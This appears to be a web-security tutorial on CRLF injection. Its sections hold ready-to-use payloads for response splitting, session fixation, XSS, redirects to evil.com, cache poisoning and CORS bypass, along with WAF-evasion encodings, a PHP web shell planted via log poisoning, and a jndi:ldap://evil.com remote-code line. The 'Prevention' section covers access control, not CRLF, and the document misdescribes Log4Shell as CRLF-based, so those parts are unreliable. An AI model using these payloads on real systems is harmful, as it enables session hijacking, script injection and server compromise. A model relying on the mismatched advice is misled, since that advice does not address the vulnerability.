---
title: CRLF Injection
---

# CRLF Injection

**CRLF Injection** is a web security vulnerability where an attacker injects Carriage Return (`\r`, `%0D`) and Line Feed (`\n`, `%0A`) characters into unsanitized user inputs. When processed by the server, these characters are interpreted as new lines, allowing attackers to split HTTP responses and inject arbitrary headers or content.

## **1. Fundamentals of the Attack**

CR and LF are special characters that tell a computer to start a new line.

- **CR (Carriage Return)**: Represented as `\r` or `%0d`. Its job is to move the cursor to the beginning of the current line.
- **LF (Line Feed)**: Represented as `\n` or `%0a`. Its job is to move the cursor down to the next line.
    
    When used together as a sequence -`\r\n` (called **CRLF**) - it’s a command to "go to the start of a new line."
    

### **Importance of CRLF:**

Different systems use different ways to mark a new line:

- **Windows** uses the full CRLF sequence (`\r\n`).
- **Unix/Linux/macOS** typically use just LF (`\n`).
- **Web Protocols (HTTP, SMTP)** **strictly require CRLF (`\r\n`)** to separate pieces of information.

### **Working of CRLF in HTTP :**

In an HTTP response, CRLF acts like a structured separator:

1. **Between Headers:** Every header line must end with a single CRLF. For example: `Content-Type: text/html` + `\r\n`.
2. **Between Headers and Body:** The end of all headers and the start of the content (body) is marked by two CRLFs in a row **(`\r\n\r\n`)** . This double CRLF is the signal that says, "The headers are done, now here comes the actual web page."

**Type of Vulnerabilities in CRLF:**

- Server-Side Injection
- HTTP Response Manipulation
- Header Injection

---

## **2. How CRLF Injection Works**

1. **HTTP Response is Dynamically Built**
    
    The application constructs response headers (e.g., `Location`, `Set-Cookie`, `Content-Type`) using user-controlled input.
    
2. **User Input is Reflected into Headers**
    
    Parameters, redirect URLs, or headers are inserted directly into the HTTP response.
    
3. **CRLF Characters Are Not Sanitized**
    
    The application fails to remove or encode Carriage Return (`\r`) and Line Feed (`\n`) characters.
    
4. **Attacker Injects CRLF Payload**
    
    The attacker supplies `%0D%0A` in input, which the server interprets as a new line.
    
5. **HTTP Response Splits**
    
    The injected CRLF breaks the original header structure and starts a new header or body.
    
6. **Malicious Headers or Body Are Injected**
    
    Attackers add forged headers like `Set-Cookie`, `Location`, or inject HTML/JS content.
    
7. **Response is Trusted by Client or Intermediaries**
    
    Browsers, proxies, or caches process the manipulated response as legitimate.
    
8. **Attack Takes Effect**
    
    Results in XSS, open redirect, cache poisoning, session hijacking, or data manipulation.
    

---

## **3. Attack Surfaces**

- **URL Parameters** – Especially in redirects (`?redirect=`).
- **HTTP Headers** – User-controlled headers like `User-Agent`, `Referer`.
- **Cookies** – Cookie values reflected in responses.
- **Form Inputs** – POST data used in header construction.
- **Log Files** – Input reflected in logs (log poisoning).

---

## **4.  Exploiting CRLF Injection**

### **a) HTTP Response Splitting**

- Injects a double CRLF to end the current response and start a second, attacker-controlled one. The browser processes the fake response, showing malicious content instead of the real page.

**`/%0D%0AContent-Length:0%0D%0A%0D%0A<h1>Injected</h1>`**

### **b) Cookie Injection (Session Fixation)**

- Injects a `Set-Cookie` header to force the victim's browser to store a session ID known to the attacker. When the victim logs in, the attacker hijacks the session.

**`/%0D%0ASet-Cookie:sessionid=ATTACKER123`**

### **c) CRLF to XSS**

- Injects headers to disable XSS filters and set content type, followed by a double CRLF and a `<script>` tag. The browser executes the script in the victim's context.

**`/%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection:0%0d%0a%0d%0a<script>alert(1)</script>`**

### **d) CRLF to Open Redirect**

- Injects a `Location` header pointing to a malicious site. The victim clicks a legitimate-looking link but gets silently redirected to [evil.com](https://evil.com/).
**`/%0d%0aLocation:https://evil.com`**
- **Alternative methods:** Can also inject HTML `<meta>` refresh tags or JavaScript `document.location` for client-side redirects.

### **e) Cache Poisoning**

- Injects malicious content into a shared cache (CDN or proxy). Every user who hits the cached URL gets the attacker's payload until it expires.

**`/%0d%0aX-Cache-Poison:true%0d%0a%0d%0a<html>Hacked for everyone</html>`**

### **f) CORS Bypass**

- Injects `Access-Control-Allow-Origin: *` to disable CORS restrictions. [Evil.com](https://evil.com/) can now make authenticated requests to the vulnerable site and read sensitive responses.

**`/%0d%0aAccess-Control-Allow-Origin:*%0d%0aAccess-Control-Allow-Credentials:true`**

### **g) Log Poisoning**

- Injects fake entries into server logs to hide malicious activity or mislead admins. In severe cases, injects executable code that runs when logs are viewed.

**`/%0d%0a[INFO] Admin login successful from 127.0.0.1`**
- **Test approach:** Check any user-controlled input (User-Agent, Referer, URL parameters) that ends up in log files. Inject CRLF and verify if new log lines are created.

---

## **5. Bypassing Defenses**

### **a) Double Encoding**

- **What it does:** When a server decodes input twice, single-encoded payloads get caught but double-encoded ones slip through. The first decode turns `%25` into `%`, revealing the real payload on the second pass.
- **Payload:** `%250D%250A` (decodes to `%0D%0A`)
- **Example:** `https://example.com/page?redirect=//home%250D%250ALocation:https://evil.com`

### **b) Unicode Encoding (UTF-8 Bypass)**

- **What it does:** Uses multibyte UTF-8 characters that decode to CR or LF. WAFs looking for single-byte `0x0D` or `0x0A` miss these, but the backend converts them back.
- **Payloads:**
For `\n`: `%E5%98%8A` (becomes `0x0A`)
For `\r`: `%E5%98%8D` (becomes `0x0D`)
- **Example (HackerOne report):** 
`/%E5%98%8ASet-Cookie:test` instead of `/%0aSet-Cookie:test`

### **c) Using only `%0a` or `%0d`**

- **What it does:** Many backends accept a single `\n` as a valid header terminator even though RFC mandates `\r\n`. If a WAF blocks the full sequence but ignores lone feeds, `%0a` works.
- **Example (Akamai bypass):** `GET /%0ASet-Cookie:test=test HTTP/1.1`
- **For Mixed case :** `%0d%0A` or `%0D%0a` can bypass case-sensitive regex filters.

### **d) HTTP/2 Exclusive Vectors (CRLF Smuggling)**

- **What it does:** HTTP/2 is binary—no `\r\n` in transit. When a frontend downgrades to HTTP/1.1 for the backend, it reconstructs headers. If it doesn't validate header values, you can smuggle raw newlines inside them.
- **Example (Uvicorn CVE):**

```
# HTTP/2 request
foo = bar\nTransfer-Encoding: chunked

# Becomes HTTP/1.1
foo: bar
Transfer-Encoding: chunked
```

### **e) Path Obfuscation (`../` and `?`)**

- **What it does:** Uses path traversal or query delimiters to move your payload into a different context where it gets reflected unsanitized.
- **Example:** `/%2F..%0d%0aSet-Cookie:test` — The `%2F..` gets normalized, but the CRLF payload remains.

### **f) Header Value Injection**

- **What it does:** Inject `Content-Encoding: deflate` plus a compressed XSS payload. The WAF sees binary garbage and allows it; the browser decompresses and executes the script.
- **Example (Akamai XSS bypass):**

```
GET /%0d%0aContent-Encoding:%20deflate%0d%0aContent-Length:%2026%0d%0a%0d%0a[compressed-binary-data] HTTP/1.1
```

### **g) Splitting with `0` Content-Length**

- **What it does:** Injects `Content-Length:0` to end the current response early, then starts a fresh attacker-controlled response. Bypasses filters looking for double CRLF.
- **Example:**

```
/%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:text/html%0d%0aContent-Length:19%0d%0a%0d%0a<html>Hacked</html>
```

---

## **6. Advanced Attack Scenarios**

### **a) Chaining with SSRF**

- CRLF injection can help bypass SSRF protections, allowing an attacker to reach internal systems that should be off-limits.
- **Example (CTF Write-up):**
    
    In a capture-the-flag challenge, the server tried to validate a URL path by checking its first character. If the path started with a number, it was blocked.
    
    - **The Bypass:** The attacker injected a newline character (`%0D%0A`) right before the path. This split the request, making the first character look valid to the validator, but the actual request sent to the internal server contained the forbidden path starting with a number .
    - **Result:** The attacker successfully reached an internal service (`http://localhost:10011/1/flag`) that was not meant to be public, retrieving the flag .

### **b) Web Cache Poisoning**

- This turns a "self-attack" into a "mass attack." By injecting headers, an attacker can trick a caching server (like Nginx) into storing a malicious version of a page and serving it to other users.
- **Example (Snyk Research):**
    
    Researchers found that by injecting a custom `X-Accel-Expires` header via CRLF, they could override a website's normal caching rules .
    
    - A page had a `Cache-Control: no-cache` header (telling caches "do not store this").
    - **The Exploit:** An attacker injected `X-Accel-Expires: 3600` into the response. Nginx respects this header. It ignored the "no-cache" instruction and cached the page for an hour .
    - **Result:** The attacker combined this with a Host Header Injection vulnerability. They poisoned the cache with a page containing malicious links. Any victim visiting the normal URL received the attacker's poisoned page from the cache, not the real one .

### **c) Log Injection (and Evasion)**

Logs are meant to track, but CRLF lets attackers blind the security team or even use logs to deliver malware.

- Sometimes applications read log files and display them in a browser (like an admin panel showing recent visits).
- Instead of just hiding, an attacker injects actual code into the log:

```
User-Agent: <?php system($_GET['cmd']); ?>
```

- Now the log file contains PHP code. When the admin panel loads the logs, that code executes on the server.
- **Result:** The attacker visits `admin/logs.php?cmd=ls` and the server runs that command. One injection + one file inclusion = full shell access .

### **d) Phishing via Response Manipulation**?

- **Example (Pi-hole Vulnerability):**
    
    A CRLF vulnerability was found in Pi-hole (a DNS tool). An attacker could inject a double CRLF (`\r\n\r\n`) to split the HTTP response and inject a whole new HTML body .
    
    - **Payload:** Visiting a URL like `http://pi-hole/admin/index%0d%0aSet-Cookie:%20sid=INYECTED.lp` injected a fake cookie .
    - **Result:** An attacker could modify this to inject a fake login form directly into the Pi-hole admin page. The URL looks legitimate, but the page content is now controlled by the attacker, stealing credentials from anyone who tries to log in.

### **e) Session Fixation**

This is a classic "man-in-the-middle" attack on sessions. Instead of stealing a cookie, the attacker forces the victim to use a cookie the **attacker already knows.

- **Example (Gakido Library):**
    
    A Python HTTP library called `gakido` was vulnerable because it didn't sanitize header values. If an attacker controlled a header, they could inject a new one.
    
    - **Code:**
        
        ```
        c.get("https://httpbin.org/headers", headers={
            "User-Agent": "test\r\nX-Injected: pwned"
        })
        ```
        
        This would send two headers: `User-Agent: test` and `X-Injected: pwned` .
        
    - **Exploiting Sessions:** An attacker could change this to inject `Set-Cookie: sessionid=attacker123`. If they send a link to a victim, the victim's browser will store that specific session ID. If the victim then logs in, the attacker can use the same `sessionid=attacker123` to hijack the authenticated account

---

## **7. Framework-Specific Scenarios**

**a) Java – The TRACE Method**

- Older Java versions (1.4.1) had a `doTrace` method that blindly echoed every header back in the response.
- **Vulnerable Code:**

```
responseString += CRLF + headerName + ": " + req.getHeader(headerName);
```

It just concatenates whatever headers the user sends—no sanitization.

- **The exploit (Cross-Site Tracing):** Attackers trick victims into sending a request with a malicious JavaScript header. The TRACE response echoes it back, and the victim's browser can read it (bypassing `HttpOnly` cookies) .

**b) PHP – Two Danger Zones**

**1. Mail Header Injection**

If user input (like email subject) goes directly into `mail()` without sanitizing CR/LF, attackers can inject `Bcc:` headers. Simple contact forms become spam relays .

**2. libcurl Header Injection**

```
$headers = ["X-API-KEY: ".$_GET["API_KEY"]];
```

- Send `?API_KEY=%0D%0AX-ADMIN-HEADER: a` and the internal server gets two headers. In cloud environments, inject `Metadata-Flavor: Google` to hit metadata servers via SSRF.

**c) Node.js – The writeHead Mistake**

**CVE-2016-5325:** Node.js `ServerResponse#writeHead` allowed unsanitized user input in the status message argument. Attackers could inject new headers and split responses—a low-level function turned dangerous .

**d) [ASP.NET](https://asp.net/) – Redirect Abuse**

- Login pages with `returnUrl=/dashboard` parameters.
- **Exploit:** `?returnUrl=/dashboard%0d%0aSet-Cookie:session=attacker123` injects a `Set-Cookie` header. The attacker fixes the session ID, waits for login, then hijacks the account .

---

## **8. Detection Techniques**

### **Manual Testing:**

**Step 1: Find Potential Injection Points**

look for places where user input might end up in response headers . Common spots:

- URL parameters (`?page=home`, `?redirect=../dashboard`)
- Path segments (`/en/home` → the `en` part)
- Request headers (`User-Agent`, `Referer`, `Cookie`)
- Form inputs that trigger redirects

**Step 2: Test Payload**

Inject a simple CRLF sequence followed by a test header:

```
%0d%0aTest:Injected
```

For example, if there's a `lang` parameter:

```
GET /page?lang=en%0d%0aTest:Injected HTTP/1.1
```

**Step 3: Check the Response**

Check the response headers in Burp. If I see `Test: Injected` appearing as a separate header.
The app is vulnerable .

**Burp’s Response :**

```
HTTP/1.1 200 OK
Date: Mon, 16 Feb 2026 10:00:00 GMT
Content-Type: text/html
Test: Injected   <-- This shouldn't be here!
Server: nginx
```

**Step 4: Confirm with a Real Exploit**

To increase it’s impact:

```
%0d%0aSet-Cookie:session=HACKED
```

If  this cookie is reflects in the response headers, the vulnerability is confirmed .

- Sometimes `%0d%0a` gets blocked. Try just `%0a` (line feed only) - many servers accept it as a valid header terminator.

---

## **9. Impact**

- **XSS:** Inject `\r\n\r\n` to end headers and insert malicious scripts in responses.
- **Session Hijacking:** Inject `Set-Cookie` headers to fix or steal user sessions.
- **Open Redirect / Phishing:** Inject `Location` headers to redirect victims to malicious sites.
- **HTTP Response Splitting:** Create multiple responses from a single request to control content.
- **Web Cache Poisoning:** Inject malicious responses that get cached and served to many users.
- **CORS Bypass:** Inject `Access-Control-Allow-Origin` to access sensitive cross-origin data.
- **Log Poisoning:** Inject fake log entries to hide attacks or trigger XSS in admin panels.

---

## **10. Prevention Techniques**

- **Enforce authorization on every request:** Verify that the authenticated user is permitted to access the requested resource before processing the request.
- **Validate object ownership on the server:** Do not rely on client-supplied object identifiers; always confirm that the requested object belongs to the current user or role.
- **Use centralized access control:** Implement authorization checks in a common middleware or service to ensure they are applied consistently across the application.
- **Restrict access based on roles or attributes:** Apply RBAC or ABAC according to the application's business requirements.
- **Scope requests to the current tenant or user:** Ensure users cannot access resources outside their assigned tenant, organization, or ownership boundary.
- **Use non-sequential identifiers where appropriate:** Prefer UUIDs or other unpredictable identifiers to reduce the likelihood of enumeration. However, identifier randomness must not replace authorization checks.
- **Log and monitor unauthorized access attempts:** Record failed authorization checks and investigate repeated attempts to access other users' resources.
- **Perform regular authorization testing:** Include horizontal and vertical privilege escalation scenarios in security assessments to verify that access controls are consistently enforced.

---

## **11. Tools**

- **Burp Suite** – Manual testing and scanning.
- **Burp Bounty** – Custom detection profiles.
- **OWASP ZAP** – Automated vulnerability scanning.
- **Nuclei** – Fast, template-based detection.
- **crlfuzz** – Command-line fuzzer for CRLF.
- **CRLFsuite** – Python-based detection tool.

---

## **12. Good to Read**

- [**CVE-2021-44228](https://nvd.nist.gov/vuln/detail/cve-2021-44228) (Log4Shell precursor):** CRLF in logs → RCE chains
Attackers injected malicious strings like `${jndi:ldap://evil.com/a}` into inputs that were written to logs. When the server processed these logs, it fetched and executed remote code, allowing full server compromise.
- [**Twitter 2010](https://hackerone.com/reports/52042/):** Cache poison via CRLF → defaced trends
Attackers injected `%0D%0A` in URL parameters to split HTTP responses and poison caching systems, causing fake trending topics and malicious content to appear for many users.
- **PayPal 2007:** Response splitting → account redirects
A vulnerable redirect parameter allowed attackers to inject CRLF sequences and create a second malicious response that redirected users to phishing pages and enabled session hijacking.

---

## **13. References**

- [OWASP CRLF Injection](https://owasp.org/www-community/vulnerabilities/CRLF_Injection)
- [CRLF Injection Attacks Explained | Redfox Security](https://redfoxsec.com/blog/understanding-crlf-injection-attacks/)
- [CRLFsuite GitHub](https://github.com/Raghavd3v/CRLFsuite)
- [Crlfix GitHub](https://github.com/RevoltSecurities/Crlfix)
- [PortSwigger – CRLF Injection](https://portswigger.net/web-security/crlf-injection)